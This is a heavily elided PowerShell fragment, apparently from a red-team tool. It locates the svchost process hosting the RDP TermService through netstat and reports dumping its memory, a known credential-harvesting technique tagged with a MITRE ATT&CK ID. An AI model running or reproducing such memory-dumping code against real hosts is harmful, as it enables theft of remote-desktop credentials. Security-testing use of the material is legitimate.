...
If((Get-Service -Name termservice).Status -ieq "Running")
{
   ...
   try{#Querying which task has loaded rdpcorets.dll
   ...
   If($QueryTasts -iMatch 'svchost.exe')
   {
      ...
      $GetTermId = netstat -nob | Select-String -Pattern "TermService"
      If($GetTermId)
      {
         #Grab RDP connection PID from netstat to prevent more svchost PIds
         $PPID = $GetTermId.split('')[-1]
      }
      ...
      If($bool)
      {
         ...
         Write-Host "[RDP] 'svchost' dumped to '" -ForeGroundColor DarkGray -NoNewline;
       ...
       Else
      {
         Write-Host "[RDP] 'Get-ProcessMiniDump' requires admin privs! [" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "VULNERABLE::T1021" -ForeGroundColor Green -NoNewline;
         Write-Host "]" -ForeGroundColor DarkGray;
      }
   }
